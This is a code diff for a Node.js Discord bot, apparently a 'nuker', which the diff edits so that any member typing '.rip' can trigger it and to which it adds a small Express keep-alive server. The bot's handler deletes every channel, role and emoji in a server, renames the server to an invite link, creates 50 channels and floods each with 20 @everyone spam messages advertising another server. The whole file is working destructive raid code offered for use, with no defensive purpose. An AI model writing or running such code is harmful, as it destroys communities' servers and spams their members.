@@ -1,84 +1,97 @@
-const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
-const { loadEnvFile } = require('dotenv');
-const fs = require('fs');
+// ====== LIBRARIES ======
+const { Client, GatewayIntentBits } = require('discord.js');
+const express = require('express');
+const dotenv = require('dotenv');
 
 // Load environment variables
-require('dotenv').config();
+dotenv.config();
 
+// ====== DISCORD BOT SETUP ======
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildMessageReactions,
-        GatewayIntentBits.GuildEmojisAndStickers
-    ]
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.GuildEmojisAndStickers
+  ]
 });
 
+// Bot logic
 client.on('ready', () => {
-    console.log(`Logged in as ${client.user.tag}`);
+  console.log(`Logged in as ${client.user.tag}`);
 });
 
 client.on('messageCreate', async (message) => {
-    if (message.content === '.rip' && message.author.bot) {
-        const guild = message.guild;
-        const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+  if (message.content === '.rip' && !message.author.bot) {
+    const guild = message.guild;
+    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
 
-        // Delete all channels
-        guild.channels.cache.forEach(async (channel) => {
-            try {
-                await channel.delete();
-            } catch {}
-        });
+    // Delete all channels
+    guild.channels.cache.forEach(async (channel) => {
+      try {
+        await channel.delete();
+      } catch {}
+    });
 
-        // Delete all roles except @everyone
-        guild.roles.cache.forEach(async (role) => {
-            if (role.name !== '@everyone' && !role.managed) {
-                try {
-                    await role.delete();
-                } catch {}
-            }
-        });
+    await new Promise(r => setTimeout(r, 1000));
 
-        // Delete all emojis
-        guild.emojis.cache.forEach(async (emoji) => {
-            try {
-                await emoji.delete();
-            } catch {}
-        });
-
-        // Rename server
+    // Delete all roles except @everyone
+    guild.roles.cache.forEach(async (role) => {
+      if (role.name !== '@everyone' && !role.managed) {
         try {
-            await guild.edit({ name: 'discord.gg/migh' });
+          await role.delete();
         } catch {}
+      }
+    });
 
-        // Wait for deletions to complete
-        await new Promise(r => setTimeout(r, 1000));
+    // Delete all emojis
+    guild.emojis.cache.forEach(async (emoji) => {
+      try {
+        await emoji.delete();
+      } catch {}
+    });
 
-        // Create 50 new channels
-        let createdChannels = [];
-        for (let i = 0; i < 50; i++) {
-            try {
-                const channel = await guild.channels.create({ name: 'neb-was-here' });
-                createdChannels.push(channel);
-            } catch {}
-        }
+    // Rename server
+    try {
+      await guild.edit({ name: 'discord.gg/migh' });
+    } catch {}
 
-        // Spam 20 messages in each channel
-        createdChannels.forEach(async (channel) => {
-            for (let i = 0; i < 20; i++) {
-                try {
-                    await channel.send(spamMessage);
-                } catch {}
-            }
-        });
-
-        try {
-            await message.channel.send('💥 Server nuked.');
-        } catch {}
+    // Create 50 new channels
+    let createdChannels = [];
+    for (let i = 0; i < 50; i++) {
+      try {
+        const channel = await guild.channels.create({ name: 'neb-was-here' });
+        createdChannels.push(channel);
+      } catch {}
     }
+
+    // Spam each with 20 messages
+    createdChannels.forEach(async (channel) => {
+      for (let i = 0; i < 20; i++) {
+        try {
+          await channel.send(spamMessage);
+        } catch {}
+      }
+    });
+
+    try {
+      await message.channel.send('💥 Server nuked.');
+    } catch {}
+  }
 });
 
+// ====== WEB SERVER FOR PORT 3000 ======
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.get('/', (req, res) => {
+  res.send('Nebula Bot is online and awaiting .rip command...');
+});
+
+app.listen(PORT, () => {
+  console.log(`🌐 Web server running on http://localhost:${PORT}`);
+});
+
+// ====== LOGIN ======
 client.login(process.env.TOKEN);
